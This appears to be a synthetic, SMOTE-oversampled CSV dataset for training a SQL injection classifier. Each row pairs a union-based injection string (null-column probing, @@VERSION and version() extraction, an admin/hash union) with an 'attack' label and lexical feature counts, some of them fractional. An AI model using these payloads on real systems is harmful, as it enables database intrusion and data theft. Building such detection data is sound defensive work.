id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000311,attack,union,"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",nearest_attack_euclidean,R000102,0.3216645263302614,66.08292978457727,23.884281678634597,3.9650852241452226,19.694309928192425,24.925746570923234,14.23143664273081,7.2314366427308086,0.2978010993706835,0.3767639988013019,0.21601580185798205,0.10941909997003255,0.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.2314366427308086,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000312,attack,union,"-5617  )   where 2132  =  2132 union all select 2132,2132,2132,2132#",nearest_attack_euclidean,R000128,0.4454919698515102,68.13848172825179,24.446073086992858,3.8415659718960935,21.769634565035712,25.368847163216074,14.0,7.0,0.3189906218213224,0.37280565189847464,0.20546915085346867,0.10273457542673434,0.0,0.0,0.8615182717482145,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.1384817282517856,1.8615182717482142,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000313,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000100,0.34755227756274554,59.10300791148372,23.735338607655816,3.943278346838137,28.50977426156279,10.348120780702327,16.0,4.245112869218605,0.4844517956092676,0.1727390463400364,0.271320605614066,0.07148855243663,0.0,1.0,0.12255643460930243,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.12255643460930177,1.1225564346093027,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000314,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000016,2.5131015999047657,77.84722070662563,29.101852862249576,4.125997940833828,44.10185286224958,2.9490735688752103,20.796294275500845,10.0,0.568340215994064,0.03744626769586662,0.2655669660329099,0.12864655027715943,0.0,0.4745367844376057,2.0,0.0,1.0,1.0,0.0,0.9490735688752115,0.0,0.0,1.0000000000000004,4.525463215562395,0.0,0.47453678443760566,1.0,0.4745367844376057,0.0,1.0,0.4745367844376056,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000315,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R000109,0.6634656649593851,66.88788478362059,23.377576956724116,3.97729554054116,19.0,28.68041043586196,10.82989739103451,8.377576956724116,0.2867870621068075,0.4226536149180463,0.16602960247693763,0.12452972049820854,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.2074743477586276,0.0,0.0,3.1701026089654896,4.0,1.0,0.0,1.0,0.0,0.0,1.0,0.2074743477586276,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000316,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000004,4.746389120076405,76.02111047389221,31.670185078982033,4.46519266365665,31.701850789820345,24.670185078982033,13.319259684071861,6.329814921017965,0.4152431437000997,0.3247412169361278,0.17639760143712585,0.08361803792664674,0.0,3.0105552369461037,0.3298149210179655,0.0,0.0,1.0,0.0,0.3298149210179654,0.0,0.0,1.3298149210179653,1.3298149210179653,0.0,1.0,0.0,0.3298149210179654,0.0,1.0,0.3298149210179654,0.0,0.0,0.0,0.0,1.0,1.0,0.3298149210179654,0.0,0.6701850789820347,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000317,attack,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#",nearest_attack_euclidean,R000097,0.6145575412822782,65.68100169745422,24.16487478781822,3.9360501239807073,34.032253819272,10.813622666000443,14.835125212181778,6.0,0.5142838206641583,0.16807075723373177,0.2260911620931864,0.09155426000892351,1.0,0.0,0.16487478781822218,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0000000000000004,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.835125212181778,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.835125212181778
SMOTE_000318,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000150,0.013571214541106002,57.03656668834007,22.004570836042507,3.809927118958927,14.000000000000002,20.054850032510107,13.972574983744947,9.009141672085018,0.24547586136659622,0.35152364860628194,0.24505393803959538,0.1579465519875264,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.9954291639574908,1.0,0.0,3.0137125081275267,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000319,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000056,0.4452319743667541,69.81832472585992,19.818324725859927,3.7043886619498196,14.000000000000002,40.0,4.0,11.818324725859926,0.20052659499750744,0.572933128564307,0.05729331285643069,0.1692469635817548,0.818324725859926,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,3.0,0.818324725859926,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000320,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000117,1.4280142724246596,59.53557415959511,20.0,3.700993540956501,14.000000000000002,20.0,16.357049439730073,9.178524719865036,0.23574365258227778,0.3367766465461111,0.27376057902953704,0.15371912184207406,0.0,0.5892623599325181,3.0,0.0,0.0,0.0,0.0,2.589262359932518,0.0,0.0,3.0,3.0,0.0,0.589262359932518,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000321,attack,union,"1"" where 2878  =  2878 union all select null,null,null,null,null#",nearest_attack_euclidean,R000155,2.067047072094254,65.97584645610951,25.415462596383257,3.9706162144716663,32.169074807233486,14.367155508602261,12.927539368328505,6.5120767719452495,0.48930696915772814,0.21655166244642052,0.195300021671701,0.09884134672415032,0.0,1.0,0.48792322805475097,0.0,0.0,1.0,0.0,0.48792322805475086,0.0,0.0,2.5362303158357475,1.487923228054751,0.0,1.0,0.0,1.0,0.0,1.0,0.48792322805475097,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000322,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000025,0.4168855962305776,79.73437022066345,29.593778676019294,4.091295237354405,40.0,2.7343702206634504,23.0,14.0,0.5016812011350414,0.03426368781504521,0.2884666906526488,0.1755884203972645,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.734370220663451,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000323,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,0.08096215922578895,70.02743997917894,15.02743997917893,3.05229592322846,50.0,1.0,8.0,11.02743997917893,0.7140096581571536,0.014280193163143079,0.11424154530514458,0.1574686033745587,0.0,0.027439979178929208,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.0,2.0,0.0,0.027439979178929264,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000324,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,1.0234751098054415,70.52014317129075,21.368009544752717,3.8309853293437297,14.000000000000002,36.4161145370326,8.0,12.10402863425815,0.20052269146190954,0.5135390121972722,0.11458439512109116,0.1713539012197272,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,7.10402863425815,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000325,attack,union,"-3300' union all select 8979,8979,8979,8979,8979,8979--",nearest_attack_euclidean,R000134,0.47437443962906545,57.55904456214452,19.170602970809636,3.7525507095387822,14.000000000000002,30.047235649715617,4.0,9.511808912428904,0.24523983795583806,0.5197258994790421,0.07006852513023945,0.16496573743488027,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.511808912428905,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000326,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000076,1.2522454012153477,72.36672696854468,16.33094807367538,3.144616403490113,46.02862311589544,1.0,14.0,11.33810385264924,0.6340687758187415,0.01394213008275727,0.1951898211586012,0.1567992729399001,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.33094807367538004,0.0,7.0071557789738605,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000327,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,0.4169080889784667,71.13480106415592,15.86519893584408,3.111724162666222,49.46079574337632,1.0,8.808806384935519,11.86519893584408,0.6954179273419254,0.014058137507011792,0.12369852206908732,0.1668254130819755,0.8651989358440801,0.0,2.0,0.0,0.0,0.0,0.0,1.1348010641559199,0.0,0.0,7.865198935844081,2.0,0.8651989358440801,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000328,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000026,0.6600861940270785,76.46059467938863,25.53940532061137,3.8533904776764385,41.842378717554524,1.9999999999999982,23.53940532061137,9.078810641222738,0.5470944968145247,0.026158375024132402,0.30791875120661943,0.11882837695472347,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000329,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000118,0.17009213318953537,62.94866425270994,20.94866425270994,3.8213594858462163,14.000000000000002,23.794657010839757,14.205342989160245,10.94866425270994,0.22240622131645185,0.37795582427492724,0.22571820501258483,0.17391974939603605,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0513357472900613,0.9486642527099386,0.0,3.9486642527099387,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000330,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000098,0.9461680709027808,67.83250062242635,15.305416770404392,3.025913095870436,51.22166708161757,1.0,4.0,11.610833540808786,0.7552619941636032,0.0147658879161561,0.05906355166462429,0.17090856625561657,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.3054167704043931,0.0,8.305416770404394,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000331,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000104,0.0170901861898261,69.0,21.0,3.529010080780892,14.000000000000002,40.0,4.0,11.0,0.2028985507246377,0.5797101449275363,0.05797101449275363,0.15942028985507245,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000332,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,0.18963882653615927,70.02627408093322,24.0,3.8678054097648427,38.22101926474657,9.0,14.0,8.805254816186645,0.5452938532996101,0.1287840067586241,0.20033067718008193,0.12559146276168384,0.0,1.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.805254816186644,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000333,attack,union,1'   )    )    as vwua where 8099  =  8099 union all select null--,nearest_attack_euclidean,R000039,1.4767271837434597,60.6985808093245,22.036105601695365,3.724882291810348,24.180528008476816,12.373630394066229,18.14442240678145,6.0,0.3941201115947822,0.2108463853235401,0.29536173582436276,0.09967176725731489,1.0,0.0,2.4819471991523185,0.0,0.0,1.0,0.0,1.5180528008476817,0.0,0.0,0.0,3.4819471991523185,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000334,attack,union," select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",nearest_attack_euclidean,R000022,2.0059138399404564,74.20620956888209,33.467356618764676,4.376297598181914,40.0,1.9999999999999982,18.738852950117415,13.467356618764677,0.5410039090858438,0.027050195454292214,0.2502037184403233,0.1817421770195407,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.9347132375293541,0.0,0.0,1.0000000000000004,4.532643381235323,1.0,0.0,1.0,0.532643381235323,0.0,1.0,0.46735661876467693,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000335,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,1.4913168745442755,65.17223824480196,14.517223824480197,3.028578618446307,48.06889529792079,1.0,6.068895297920784,10.034447648960391,0.7395739901462755,0.015435181370285211,0.09129637259429504,0.15369445588914427,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.5172238244801961,0.0,0.0,7.517223824480196,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.5172238244801961,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000336,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000064,0.5458464058784109,71.22779113533024,21.277220886466974,3.5664414392909563,14.000000000000002,37.78223290826419,8.0,11.445558227066048,0.19738406336684472,0.5293018559540416,0.1127908933524827,0.16052318732663107,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,7.445558227066048,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000337,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R000109,0.1734269206861008,65.82310551399205,23.16462110279841,3.9280949576892463,19.0,28.65848441119364,10.0,8.16462110279841,0.2888705484031101,0.4351108862276504,0.15203713073847902,0.1239814346307605,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.16462110279841,4.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000338,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000035,1.0732065872558083,74.37046631934209,26.193436959853795,4.113669419222796,32.22625216058482,17.950777198903463,15.0,9.193436959853795,0.43810928005661387,0.23620762353219257,0.20242344950016145,0.12325964691103218,3.0,0.0,0.5967184799268976,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.5967184799268979,2.596718479926898,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000339,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,0.6973782532882463,71.22548694339991,15.774513056600089,3.109943439667367,49.098052226400355,1.0,9.352921660399472,11.774513056600089,0.6894928327277835,0.014040397702777818,0.13111376023888172,0.16535300933055697,0.7745130566000878,0.0,2.0,0.0,0.0,0.0,0.0,1.2254869433999123,0.0,0.0,7.774513056600088,2.0,0.7745130566000877,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000340,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000078,0.5106172224608067,79.76436909965832,18.58812303321944,3.387980985397321,56.66603052157682,1.0,11.961046255821307,10.137292322260187,0.7084792001659606,0.012557549880031188,0.1514809133445275,0.12748233660948077,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2745846445203735,0.0,0.0,6.862707677739813,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000341,attack,union," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",nearest_attack_euclidean,R000028,0.7383331133422116,76.3099425067207,25.690057493279298,3.889990978459585,41.23977002688281,1.9999999999999982,23.0,10.070172479837897,0.5402981581979264,0.026209862437894527,0.3014134180357867,0.1320785613283924,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,5.380114986558597,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000342,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000142,0.8120683011346699,68.44934950748168,20.483116502493893,3.786978836954222,14.000000000000002,28.0,14.966233004987787,11.483116502493894,0.20480660537625361,0.40961321075250723,0.21804267393773016,0.16753750993350897,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.2415582512469467,0.24155825124694683,0.0,5.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000343,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000058,1.7123275734590098,55.54756133335424,16.0,3.2579123664781386,38.0,1.0,8.0,8.547561333354238,0.6841534640690061,0.018004038528131733,0.14403230822505392,0.15381018917780817,1.0,0.0,1.095122666708476,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.0,1.095122666708476,1.0,0.0,0.5475613333542381,0.45243866664576193,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
